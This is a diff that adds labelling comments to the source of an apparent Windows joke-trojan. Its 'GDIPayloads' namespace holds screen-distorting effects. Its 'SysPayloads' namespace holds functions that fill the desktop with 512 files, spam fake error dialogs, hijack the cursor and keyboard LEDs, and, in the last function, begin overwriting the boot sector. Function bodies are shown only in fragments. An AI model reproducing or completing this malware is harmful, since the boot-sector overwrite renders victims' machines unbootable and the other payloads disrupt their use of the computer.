@@ -6,13 +6,16 @@
 #include "maths.h"
 #include "boot.h"
 
+//SETTINGS
 HDC dc = GetDC(NULL);
 HDC dcCopy = CreateCompatibleDC(dc);
 
+//SETTING WIDTH AND HEIGHT
 int w = GetSystemMetrics(0);
 int h = GetSystemMetrics(1);
 
 
+//CIRCLE CONFIG
 void ci(int x, int y, int w, int h) {
     HDC hdc = GetDC(0);
     HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
@@ -26,6 +29,7 @@ void ci(int x, int y, int w, int h) {
 
 namespace GDIPayloads
 {
+    //UPDATING SCREEN
     DWORD WINAPI Reset(LPVOID lpParam)
     {
         while (true)
@@ -36,6 +40,7 @@ namespace GDIPayloads
         return 0;
     }
 
+    //SCREEN SHAKE
     DWORD WINAPI Shake(LPVOID lpParam)
     {
         while (1) {
@@ -50,6 +55,7 @@ namespace GDIPayloads
         }
     }
 
+    //BIG CIRCLES
     DWORD WINAPI Circles(LPVOID lpParam)
     {
         while (1) {
@@ -65,6 +71,7 @@ namespace GDIPayloads
         }
     }
 
+    //SHADERS
     DWORD WINAPI Shader1(LPVOID lpParam)
     {
         while (1) {
@@ -94,6 +101,7 @@ namespace GDIPayloads
         }
     }
 
+    //INVERTING CIRCLES
     DWORD WINAPI InvertCircles(LPVOID lpParam)
     {
         int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
@@ -103,6 +111,7 @@ namespace GDIPayloads
         }
     }
 
+    //RANDOM ICONS
     DWORD WINAPI Icons(LPVOID lpParam)
     {
         HDC hDc = GetWindowDC(GetDesktopWindow());
@@ -132,6 +141,7 @@ namespace GDIPayloads
         }
     }
 
+    //BRIGHT AND DARK SCREEN
     DWORD WINAPI Bright(LPVOID lpParam)
     {
         srand(static_cast<unsigned int>(time(0)));
@@ -152,6 +162,7 @@ namespace GDIPayloads
         };
     }
 
+    //ROTATING TESSERACT
     DWORD WINAPI Tesseract(LPVOID lpParam)
     {
         HDC dc = GetDC(NULL);
@@ -210,6 +221,7 @@ namespace GDIPayloads
         return 0;
     }
 
+    //RANDOM COLORS
     DWORD WINAPI Colors1(LPVOID lpParam)
     {
         while (1) {
@@ -233,6 +245,7 @@ namespace GDIPayloads
         }
     }
 
+    //SINE WAVES
     DWORD WINAPI Waves(LPVOID lpParam)
     {
         HDC dc = GetDC(NULL);
@@ -264,6 +277,7 @@ namespace GDIPayloads
         return 0x00;
     }
 
+    //HSL SHADERS
     DWORD WINAPI Shader4(LPVOID lpParam)
     {
         HDC hdc = GetDC(NULL);
@@ -323,6 +337,7 @@ namespace GDIPayloads
         return 0x00;
     }
 
+    //SRCINVERT EFFECT
     DWORD WINAPI Neon(LPVOID lpParam)
     {
         while (1) {
@@ -337,6 +352,7 @@ namespace GDIPayloads
         }
     }
 
+    //FADING INVERT
     DWORD WINAPI Inverting(LPVOID lpParam)
     {
         {
@@ -361,6 +377,7 @@ namespace GDIPayloads
         }
     }
 
+    //MASHING SCREEN
     DWORD WINAPI Masher(LPVOID lpParam)
     {
         while (1) {
@@ -371,6 +388,7 @@ namespace GDIPayloads
         }
     }
 
+    //OTHER HSL SHADER
     DWORD WINAPI Shader2(LPVOID lpParam)
     {
         HDC hdc = GetDC(NULL);
@@ -431,6 +449,7 @@ namespace GDIPayloads
 
     }
 
+    //OTHER HSL SHADER AGAIN
     DWORD WINAPI Shader3(LPVOID lpParam)
     {
         HDC hdc = GetDC(NULL);
@@ -490,6 +509,7 @@ namespace GDIPayloads
         return 0x00;
     }
 
+    //RANDOM TEXTS
     DWORD WINAPI Texts(LPVOID lpParam)
     {
         HDC dc = GetDC(NULL);
@@ -539,6 +559,7 @@ namespace GDIPayloads
         return 0x00;
     }
 
+    //FAST COLORS
     DWORD WINAPI Colors2(LPVOID lpParam)
     {
         while (1) {
@@ -561,6 +582,7 @@ namespace GDIPayloads
         }
     }
 
+    //STRETCHING SCREEN
     DWORD WINAPI Stretch(LPVOID lpParam)
     {
         HDC desk;
@@ -576,6 +598,7 @@ namespace GDIPayloads
         }
     }
 
+    //RANDOM CURSOR ICONS
     DWORD WINAPI Cursors(LPVOID lpParam)
     {
         HDC hDc = GetWindowDC(GetDesktopWindow());
@@ -604,6 +627,7 @@ namespace GDIPayloads
 
 namespace SysPayloads
 {
+    //CREATE A LOT OF FILES IN YOUR DESKTOP
     DWORD WINAPI Messdesktop(LPVOID lpvd)
     {
         for (int i = 0; i < 512; i++)
@@ -614,6 +638,7 @@ namespace SysPayloads
         return 0;
     }
 
+    //MESS ALL LABELS
     DWORD WINAPI MessedLabels(LPVOID lpvd)
     {
         while (true)
@@ -623,6 +648,7 @@ namespace SysPayloads
         }
     }
 
+    //SOME FAKE ERROR MESSAGES
     DWORD WINAPI Msgbox(LPVOID lpParam)
     {
         while (1)
@@ -634,6 +660,7 @@ namespace SysPayloads
         }
     }
 
+    //PRESS CAPS LOCK KEY / BLINK KB LEDS
     DWORD WINAPI KeyboardCAPS(LPVOID lpvd)
     {
         while (true)
@@ -645,6 +672,7 @@ namespace SysPayloads
         return 0x00;
     }
 
+    //CURSOR SHAKING
     DWORD WINAPI CursorMove(LPVOID lpvd)
     {
         POINT pt;
@@ -662,6 +690,7 @@ namespace SysPayloads
         return 0;
     }
 
+    //OVERWRITE BOOTLOADER
     DWORD WINAPI Bootsector(LPVOID lpParam)
     {
         DWORD dwBytesWritten;
